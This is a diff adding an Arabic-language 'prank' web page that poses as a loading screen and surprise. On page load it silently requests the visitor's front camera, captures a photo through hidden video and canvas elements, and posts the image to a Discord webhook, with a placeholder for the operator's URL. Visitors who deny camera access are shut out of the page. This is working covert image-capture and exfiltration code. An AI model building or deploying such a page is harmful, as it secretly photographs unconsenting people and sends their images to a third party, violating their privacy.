@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تحميل...</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .container {
+      text-align: center;
+      background: rgba(255, 255, 255, 0.95);
+      padding: 60px 40px;
+      border-radius: 20px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+      max-width: 500px;
+      width: 100%;
+    }
+
+    h1 {
+      color: #333;
+      margin-bottom: 30px;
+      font-size: 28px;
+    }
+
+    .loading-spinner {
+      width: 60px;
+      height: 60px;
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #2a5298;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 30px auto;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    #loadingScreen {
+      display: block;
+    }
+
+    #mainScreen {
+      display: none;
+    }
+
+    #photoScreen {
+      display: none;
+    }
+
+    .red-btn {
+      background: linear-gradient(135deg, #ff4757, #ff6348);
+      color: white;
+      padding: 20px 60px;
+      font-size: 24px;
+      font-weight: bold;
+      border: none;
+      border-radius: 15px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 10px 25px rgba(255, 71, 87, 0.4);
+      margin-top: 20px;
+    }
+
+    .red-btn:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 15px 35px rgba(255, 71, 87, 0.6);
+    }
+
+    .red-btn:active {
+      transform: translateY(-2px);
+    }
+
+    #capturedPhoto {
+      max-width: 100%;
+      border-radius: 15px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+      margin-top: 20px;
+    }
+
+    video, canvas {
+      display: none;
+    }
+
+    .error-screen {
+      color: #e74c3c;
+      padding: 40px;
+    }
+
+    .success-icon {
+      font-size: 60px;
+      margin-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- شاشة التحميل -->
+    <div id="loadingScreen">
+      <h1>جارٍ التحميل...</h1>
+      <div class="loading-spinner"></div>
+      <p style="color: #666; margin-top: 20px;">يرجى الانتظار قليلاً</p>
+    </div>
+
+    <!-- الشاشة الرئيسية -->
+    <div id="mainScreen">
+      <div class="success-icon">✨</div>
+      <h1>مرحباً بك!</h1>
+      <p style="color: #666; font-size: 18px; margin: 20px 0;">
+        اضغط على الزر الأحمر لرؤية مفاجأة خاصة!
+      </p>
+      <button class="red-btn" onclick="showPhoto()">اضغط هنا 🎁</button>
+    </div>
+
+    <!-- شاشة عرض الصورة -->
+    <div id="photoScreen">
+      <h1>🎉 مفاجأة!</h1>
+      <p style="color: #666; margin: 20px 0;">هذه هي صورتك!</p>
+      <img id="capturedPhoto" alt="صورتك">
+      <p style="color: #ff4757; font-weight: bold; margin-top: 20px; font-size: 20px;">
+        😂 تم مقلبك!
+      </p>
+    </div>
+  </div>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const loadingScreen = document.getElementById('loadingScreen');
+    const mainScreen = document.getElementById('mainScreen');
+    const photoScreen = document.getElementById('photoScreen');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const capturedPhoto = document.getElementById('capturedPhoto');
+
+    // ضع Webhook الخاص بك من Discord هنا
+    const DISCORD_WEBHOOK = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
+
+    let savedPhotoData = null;
+
+    // تشغيل تلقائي عند فتح الصفحة
+    window.onload = async function() {
+      try {
+        // طلب صلاحية الكاميرا مباشرة (بدون أي شكل واضح)
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: "user" } 
+        });
+        
+        // تشغيل الفيديو (مخفي)
+        video.srcObject = stream;
+        
+        await new Promise(resolve => {
+          video.onloadedmetadata = () => {
+            video.play();
+            setTimeout(resolve, 2000); // انتظر ثانيتين للحصول على صورة واضحة
+          };
+        });
+
+        // التقط الصورة
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0);
+        
+        savedPhotoData = canvas.toDataURL('image/png');
+
+        // أوقف الكاميرا
+        stream.getTracks().forEach(track => track.stop());
+
+        // أرسل الصورة للـ Discord
+        await sendToDiscord(savedPhotoData);
+
+        // أظهر الشاشة الرئيسية
+        loadingScreen.style.display = 'none';
+        mainScreen.style.display = 'block';
+
+      } catch (error) {
+        console.error('خطأ:', error);
+        // إذا رفض الصلاحية، أخرجه من الموقع
+        document.body.innerHTML = `
+          <div class="container">
+            <div class="error-screen">
+              <h1>⚠️ عذراً</h1>
+              <p>لا يمكن الوصول إلى هذه الصفحة.</p>
+            </div>
+          </div>
+        `;
+      }
+    };
+
+    // إرسال الصورة للـ Discord
+    async function sendToDiscord(imageData) {
+      try {
+        // تحويل base64 إلى blob
+        const blob = await fetch(imageData).then(r => r.blob());
+        
+        // إنشاء FormData لإرسال الصورة
+        const formData = new FormData();
+        formData.append('file', blob, 'prank.png');
+        formData.append('content', '🎯 تم التقاط صورة جديدة من المقلب!');
+
+        await fetch(DISCORD_WEBHOOK, {
+          method: 'POST',
+          body: formData
+        });
+
+        console.log('✅ تم إرسال الصورة للـ Discord');
+      } catch (error) {
+        console.error('خطأ في إرسال Discord:', error);
+      }
+    }
+
+    // عرض الصورة عند الضغط على الزر الأحمر
+    function showPhoto() {
+      if (savedPhotoData) {
+        capturedPhoto.src = savedPhotoData;
+        mainScreen.style.display = 'none';
+        photoScreen.style.display = 'block';
+      }
+    }
+  </script>
+</body>
+</html>
